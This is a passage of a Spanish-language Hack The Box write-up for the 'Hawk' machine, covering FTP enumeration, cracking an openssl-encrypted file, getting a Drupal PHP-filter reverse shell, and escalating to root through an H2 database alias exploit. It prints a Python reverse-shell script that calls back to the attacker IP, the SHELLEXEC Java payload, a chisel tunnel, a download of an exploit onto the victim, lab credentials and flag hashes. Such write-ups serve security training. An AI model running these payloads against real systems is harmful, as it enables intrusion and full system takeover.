-    <p>Si nos conectamos vemos que no hay nada dentro del directorio <code class="language-plaintext highlighter-rouge">messages</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.102
-Connected to 10.10.10.102.
-220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
-Name <span class="o">(</span>10.10.10.102:miguel<span class="o">)</span>: anonymous
-230 Login successful.
-Remote system <span class="nb">type </span>is UNIX.
-Using binary mode to transfer files.
-ftp&gt; <span class="nb">dir
-</span>229 Entering Extended Passive Mode <span class="o">(||</span>|46148|<span class="o">)</span>
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
-226 Directory send OK.
-ftp&gt; <span class="nb">cd </span>messages
-250 Directory successfully changed.
-ftp&gt; <span class="nb">dir
-</span>229 Entering Extended Passive Mode <span class="o">(||</span>|45380|<span class="o">)</span>
-150 Here comes the directory listing.
-226 Directory send OK.
-ftp&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Sin embargo podemos ver archivos ocultos dentro de <code class="language-plaintext highlighter-rouge">messages</code> vemos un <code class="language-plaintext highlighter-rouge">.enc</code> <a href="https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381">https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381</a> en conclusión es un archivo cifrado.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-a</span>
-229 Entering Extended Passive Mode <span class="o">(||</span>|43596|<span class="o">)</span>
-150 Here comes the directory listing.
-drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 <span class="nb">.</span>
-drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-<span class="nt">-rw-r--r--</span>    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
-226 Directory send OK.
-ftp&gt; get .drupal.txt.enc
-<span class="nb">local</span>: .drupal.txt.enc remote: .drupal.txt.enc
-229 Entering Extended Passive Mode <span class="o">(||</span>|48850|<span class="o">)</span>
-150 Opening BINARY mode data connection <span class="k">for</span> .drupal.txt.enc <span class="o">(</span>240 bytes<span class="o">)</span><span class="nb">.</span>
-100% |<span class="k">***************************************************************************</span>|   240        2.60 MiB/s    00:00 ETA
-226 Transfer complete.
-240 bytes received <span class="k">in </span>00:00 <span class="o">(</span>2.26 KiB/s<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si vemos mas información nos habla sobre <code class="language-plaintext highlighter-rouge">openssl</code> además que se utilizo una contraseña con salt para el proceso de cifrado y los datos se codificaron en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file .drupal.txt.enc
-.drupal.txt.enc: openssl enc<span class="s1">'d data with salted password, base64 encoded
-</span></code></pre></div></div>
-
-<ul>
-  <li>Como no conocemos la contraseña se vuelve mas complejo sin embargo hoy en día existen herramientas las cuales pueden aplicar fuerza bruta para saber la contraseña <a href="https://github.com/deltaclock/go-openssl-bruteforce">https://github.com/deltaclock/go-openssl-bruteforce</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
-Cloning into <span class="s1">'go-openssl-bruteforce'</span>...
-remote: Enumerating objects: 31, <span class="k">done</span><span class="nb">.</span>
-remote: Total 31 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 31
-Receiving objects: 100% <span class="o">(</span>31/31<span class="o">)</span>, 1.72 MiB | 2.84 MiB/s, <span class="k">done</span><span class="nb">.</span>
-Resolving deltas: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-❯ <span class="nb">cd </span>go-openssl-bruteforce
-❯ go mod tidy
-❯ go build <span class="nt">-o</span> openssl-brute
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora le pasamos el archivo y nos da la contraseña y el algoritmo con el cual fue encriptado.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./openssl-brute <span class="nt">--file</span> .drupal.txt.enc
-Bruteforcing Started
-CRACKED!! Results <span class="k">in </span>file <span class="o">[</span> result-aes256 <span class="o">]</span>
-<span class="nt">--------------------------------------------------</span>
-Found password <span class="o">[</span> friends <span class="o">]</span> using <span class="o">[</span> aes256 <span class="o">]</span> algorithm!!
-<span class="nt">--------------------------------------------------</span>
-Daniel,
-
-Following the password <span class="k">for </span>the portal:
-
-PencilKeyboardScanner123
-
-Please <span class="nb">let </span>us know when the portal is ready.
-
-Kind Regards,
-
-IT department
-
-<span class="nt">--------------------------------------------------</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos probar a conectarnos por ssh pero no nos deja.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>creds.txt
-Daniel:PencilKeyboardScanner123
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102
-The authenticity of host <span class="s1">'10.10.10.102 (10.10.10.102)'</span> can<span class="s1">'t be established.
-ED25519 key fingerprint is SHA256:jcuqa44g/a1pFArv7e9IFSswe7plzlg2gNBVim3xXhY.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '</span>10.10.10.102<span class="s1">' (ED25519) to the list of known hosts.
-daniel@10.10.10.102'</span>s password:
-Permission denied, please try again.
-daniel@10.10.10.102<span class="s1">'s password:
-Permission denied, please try again.
-daniel@10.10.10.102'</span>s password:
-daniel@10.10.10.102: Permission denied <span class="o">(</span>publickey,password<span class="o">)</span><span class="nb">.</span>
-</code></pre></div></div>
-
-<h2 id="drupal">Drupal</h2>
-
-<ul>
-  <li>Nos hablan sobre un portal lo mas probable es que se refiera al Drupal 7 que vimos con Nmap.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/1.png" />
-</p>
-
-<ul>
-  <li>Si nos conectamos con la contraseña que vimos nos deja y como username usamos Admin.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/2.png" />
-</p>
-
-<ul>
-  <li>Podemos ir a Modules y en este caso como somos usuarios administradores podemos habilitar Path y PHP filter.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/3.png" />
-</p>
-
-<ul>
-  <li>Vamos añadir contenido.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/4.png" />
-</p>
-
-<ul>
-  <li>Damos Click en Basic Page.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/5.png" />
-</p>
-
-<ul>
-  <li>Vamos a ver si el PHP lo interpreta en Text format indicamos que es PHP code.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/6.png" />
-</p>
-
-<ul>
-  <li>Y vemos esto.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/7.png" />
-</p>
-
-<h2 id="shell-as-www-data">Shell as www-data</h2>
-
-<ul>
-  <li>Vamos a enviarnos una reverse shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 433
-listening on <span class="o">[</span>any] 433 ...
-</code></pre></div></div>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/8.png" />
-</p>
-
-<ul>
-  <li>Al darle a Save nos llega la shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 433
-listening on <span class="o">[</span>any] 433 ...
-connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 53012
-/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
-$ whoami
-www-data
-</span></code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
-Script started, file is /dev/null
-www-data@hawk:/var/www/html<span class="nv">$ </span>^Z
-<span class="o">[</span>1]  + 25347 suspended  nc <span class="nt">-nlvp</span> 433
-❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1]  + 25347 continued  nc <span class="nt">-nlvp</span> 433
-                                    reset xterm
-ENTER
-www-data@hawk:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div></div>
-
-<h2 id="shell-as-daniel-and-user-flag">Shell as Daniel and User flag</h2>
-
-<ul>
-  <li>Vemos la flag en el directorio de Daniel.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/home/daniel<span class="nv">$ </span><span class="nb">cat </span>user.txt
-3c9bfe74f2f6661740425db2ac4f0c08
-www-data@hawk:/home/daniel<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos una contraseña en los archivos de configuración.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">cat </span>settings.php | <span class="nb">grep </span>password
- <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
- <span class="k">*</span> username, password, host, and database name.
- <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
- <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
- <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
- <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
-      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'drupal4hawk'</span>,
- <span class="k">*</span> by using the username and password variables. The proxy_user_agent variable
-<span class="c"># $conf['proxy_password'] = '';</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si migramos a Daniel se nos ejecuta python3.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span>su daniel
-Password:
-Python 3.6.5 <span class="o">(</span>default, Apr  1 2018, 05:46:30<span class="o">)</span>
-<span class="o">[</span>GCC 7.3.0] on linux
-Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
-<span class="o">&gt;&gt;&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos ejecutar una bash.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> import os
-<span class="o">&gt;&gt;&gt;</span> os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
-daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">whoami
-</span>daniel
-daniel@hawk:/var/www/html/sites/default<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>También funcionan por SSH.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102
-daniel@10.10.10.102<span class="s1">'s password:
-Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed Jul  3 00:17:56 UTC 2024
-
-  System load:  0.0               Processes:           176
-  Usage of /:   47.5% of 7.32GB   Users logged in:     0
-  Memory usage: 44%               IP address for eth0: 10.10.10.102
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-417 packages can be updated.
-268 updates are security updates.
-
-
-Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
-Python 3.6.5 (default, Apr  1 2018, 05:46:30)
-[GCC 7.3.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
-&gt;&gt;&gt; os.system("/bin/bash")
-daniel@hawk:~$
-</span></code></pre></div></div>
-
-<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
-
-<ul>
-  <li>Como estamos ante un Drupal podemos ver mas usuarios y sus hashes conectándonos al servicio de la base de datos la misma password para Daniel funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span>mysql <span class="nt">-u</span> drupal <span class="nt">-p</span>
-Enter password:
-Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
-Your MySQL connection <span class="nb">id </span>is 73
-Server version: 5.7.22-0ubuntu18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
-
-Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle and/or its affiliates. All rights reserved.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
-
-mysql&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos el hash del admin.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; show databases<span class="p">;</span>
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| drupal             |
-| mysql              |
-| performance_schema |
-| sys                |
-+--------------------+
-5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
-
-mysql&gt; use drupal<span class="p">;</span>
-Reading table information <span class="k">for </span>completion of table and column names
-You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
-
-Database changed
-mysql&gt; show tables<span class="p">;</span>
-+-----------------------------+
-| Tables_in_drupal            |
-+-----------------------------+
-| actions                     |
-| authmap                     |
-| batch                       |
-| block                       |
-| block_custom                |
-| block_node_type             |
-| block_role                  |
-| blocked_ips                 |
-| cache                       |
-| cache_block                 |
-| cache_bootstrap             |
-| cache_field                 |
-| cache_filter                |
-| cache_form                  |
-| cache_image                 |
-| cache_menu                  |
-| cache_page                  |
-| cache_path                  |
-| comment                     |
-| date_format_locale          |
-| date_format_type            |
-| date_formats                |
-| field_config                |
-| field_config_instance       |
-| field_data_body             |
-| field_data_comment_body     |
-| field_data_field_image      |
-| field_data_field_tags       |
-| field_revision_body         |
-| field_revision_comment_body |
-| field_revision_field_image  |
-| field_revision_field_tags   |
-| file_managed                |
-| file_usage                  |
-| filter                      |
-| filter_format               |
-| flood                       |
-| <span class="nb">history</span>                     |
-| image_effects               |
-| image_styles                |
-| menu_custom                 |
-| menu_links                  |
-| menu_router                 |
-| node                        |
-| node_access                 |
-| node_comment_statistics     |
-| node_revision               |
-| node_type                   |
-| queue                       |
-| rdf_mapping                 |
-| registry                    |
-| registry_file               |
-| role                        |
-| role_permission             |
-| search_dataset              |
-| search_index                |
-| search_node_links           |
-| search_total                |
-| semaphore                   |
-| sequences                   |
-| sessions                    |
-| shortcut_set                |
-| shortcut_set_users          |
-| system                      |
-| taxonomy_index              |
-| taxonomy_term_data          |
-| taxonomy_term_hierarchy     |
-| taxonomy_vocabulary         |
-| url_alias                   |
-| <span class="nb">users</span>                       |
-| users_roles                 |
-| variable                    |
-| watchdog                    |
-+-----------------------------+
-73 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
-
-mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
-+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
-| uid | name  | pass                                                    | mail             | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init             | data                     |
-+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
-|   0 |       |                                                         |                  |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                  | NULL                     |
-|   1 | admin | <span class="nv">$S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08</span> | admin@hawk.local |       |           | filtered_html    | 1528733367 | 1719965351 | 1719964196 |      1 | Europe/London |          |       0 | admin@hawk.local | a:1:<span class="o">{</span>s:7:<span class="s2">"overlay"</span><span class="p">;</span>i:1<span class="p">;</span><span class="o">}</span> |
-+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
-2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
-</code></pre></div></div>
-
-<blockquote>
-  <p>La contraseña no esta en el rockyou.txt.</p>
-</blockquote>
-
-<ul>
-  <li>Vemos el pkexec pero no lo vamos a explotar.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"snap"</span>
-./bin/ping
-./bin/fusermount
-./bin/su
-./bin/ntfs-3g
-./bin/mount
-./bin/umount
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/openssh/ssh-keysign
-./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/bin/chfn
-./usr/bin/passwd
-./usr/bin/newgidmap
-./usr/bin/chsh
-./usr/bin/newgrp
-./usr/bin/at
-./usr/bin/gpasswd
-./usr/bin/pkexec
-./usr/bin/sudo
-./usr/bin/newuidmap
-./usr/bin/traceroute6.iputils
-</code></pre></div></div>
-
-<ul>
-  <li>El puerto 8082 esta abierto el cual esta corriendo  H2 database http console como vimos en Nmap <a href="https://www.h2database.com/html/quickstart.html">https://www.h2database.com/html/quickstart.html</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>netstat <span class="nt">-nat</span>
-Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
-Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN
-tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN
-tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN
-tcp        0      2 10.10.10.102:53012      10.10.14.63:433         ESTABLISHED
-tcp6       0      0 :::9092                 :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 :::8082                 :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 :::5435                 :::<span class="k">*</span>                    LISTEN
-tcp6       0      0 10.10.10.102:80         10.10.14.63:52754       ESTABLISHED
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Vamos hacer Port Forwarding para ver que es.</p>
-  </li>
-  <li>
-    <p>Bueno si lo hago por SSH me da un error.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102 <span class="nt">-L</span> 8082:localhost:8082
-daniel@10.10.10.102<span class="s1">'s password:
-Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed Jul  3 00:35:55 UTC 2024
-
-  System load:  0.01              Processes:           177
-  Usage of /:   47.5% of 7.32GB   Users logged in:     0
-  Memory usage: 68%               IP address for eth0: 10.10.10.102
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-417 packages can be updated.
-268 updates are security updates.
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-</span></code></pre></div></div>
-
-<ul>
-  <li>Vamos a usar chisel <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel_1.9.1_linux_amd64 server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
-2024/07/02 18:38:36 server: Reverse tunnelling enabled
-2024/07/02 18:38:36 server: Fingerprint <span class="nv">p1HWvBEOgawHr1W0leahUeW7u9yV9XBtPOme4dn1lOE</span><span class="o">=</span>
-2024/07/02 18:38:36 server: Listening on http://0.0.0.0:8000
-</code></pre></div></div>
-
-<ul>
-  <li>Ejecutamos esto en la máquina victima.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>./chisel_1.9.1_linux_amd64 client http://10.10.14.63:8000 R:8082:127.0.0.1:8082
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos esto.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/9.png" />
-</p>
-
-<ul>
-  <li>Si buscamos vulnerabilidades vemos Remote Code Execution.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit H2 database
-
-<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
- Exploit Title                                                                                    |  Path
-<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                    | java/local/44422.py
-H2 Database 1.4.196 - Remote Code Execution                                                       | java/webapps/45506.py
-H2 Database 1.4.197 - Information Disclosure                                                      | linux/webapps/45105.py
-H2 Database 1.4.199 - JNI Code Execution                                                          | java/local/49384.txt
-Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow        | multiple/remote/31010.sql
-<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Si podemos cualquier nombre en <code class="language-plaintext highlighter-rouge">JDBC</code> Url como /testing y nos conectamos sin contraseña funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/10.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Podemos obtener RCE <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a>.</p>
-  </li>
-  <li>
-    <p>Estamos como root.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/11.png" />
-</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS SHELLEXEC AS <span class="nv">$$</span> String shellexec<span class="o">(</span>String cmd<span class="o">)</span> throws java.io.IOException <span class="o">{</span> java.util.Scanner s <span class="o">=</span> new
-java.util.Scanner<span class="o">(</span>Runtime.getRuntime<span class="o">()</span>.exec<span class="o">(</span>cmd<span class="o">)</span>.getInputStream<span class="o">())</span>.useDelimiter<span class="o">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">A"</span><span class="o">)</span><span class="p">;</span> <span class="k">return </span>s.hasNext<span class="o">()</span> ? s.next<span class="o">()</span> : <span class="s2">""</span><span class="p">;</span> <span class="o">}</span><span class="nv">$$</span><span class="p">;</span>
-CALL SHELLEXEC<span class="o">(</span><span class="s1">'id'</span><span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Usaremos el siguiente script para recibir la reverse shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>reverse.py
-import socket
-import subprocess
-import os
-
-s <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
-s.connect<span class="o">((</span><span class="s2">"10.10.14.63"</span>, 8080<span class="o">))</span>
-os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 0<span class="o">)</span>
-os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 1<span class="o">)</span>
-os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 2<span class="o">)</span>
-subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>, <span class="s2">"-i"</span><span class="o">])</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a meter eso en /tmp.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x reverse.py
-</code></pre></div></div>
-
-<ul>
-  <li>Nos ponemos en escucha.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 8080
-listening on <span class="o">[</span>any] 8080 ...
-</code></pre></div></div>
-
-<ul>
-  <li>Y ejecutamos solo que ahora ejecutamos python3 y la ruta del archivo en python3.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/hawk/12.png" />
-</p>
-
-<h2 id="roottxt">root.txt</h2>
-
-<ul>
-  <li>Al darle a run nos llega la shell como root.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 8080
-listening on <span class="o">[</span>any] 8080 ...
-connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 40912
-/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
-# whoami
-root
-# script /dev/null -c bash
-Script started, file is /dev/null
-root@hawk:~# cat /root/root.txt
-cat /root/root.txt
-5aa913cca6cd0865e7172edbc21d66f4
-root@hawk:~#
-</span></code></pre></div></div>
-
-<h2 id="second-way">Second way</h2>
-
-<ul>
-  <li>Como vimos antes hay un script que también nos da RCE.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit H2 database
-
-<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
- Exploit Title                                                                                                   |  Path
-<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                                   | java/local/44422.py
-H2 Database 1.4.196 - Remote Code Execution                                                                      | java/webapps/45506.py
-H2 Database 1.4.197 - Information Disclosure                                                                     | linux/webapps/45105.py
-H2 Database 1.4.199 - JNI Code Execution                                                                         | java/local/49384.txt
-Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                       | multiple/remote/31010.sql
-<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-Shellcodes: No Results
-❯ searchsploit <span class="nt">-m</span> 45506
-
-  Exploit: H2 Database 1.4.196 - Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/45506
-     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
-    Codes: N/A
- Verified: False
-File Type: Python script, Unicode text, UTF-8 text executable
-Copied to: /home/miguel/Downloads/45506.py
-</code></pre></div></div>
-
-<ul>
-  <li>Lo descargamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>wget http://10.10.14.63/45506.py
-<span class="nt">--2024-07-03</span> 01:08:30--  http://10.10.14.63/45506.py
-Connecting to 10.10.14.63:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3756 <span class="o">(</span>3.7K<span class="o">)</span> <span class="o">[</span>text/x-python]
-Saving to: ‘45506.py’
-
-45506.py                         100%[<span class="o">==========================================================&gt;]</span>   3.67K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s
-
-2024-07-03 01:08:30 <span class="o">(</span>1.14 MB/s<span class="o">)</span> - ‘45506.py’ saved <span class="o">[</span>3756/3756]
-
-daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 45506.py
-</code></pre></div></div>
-
-<ul>
-  <li>Ejecutamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>python3 45506.py <span class="nt">--host</span> 127.0.0.1:8082
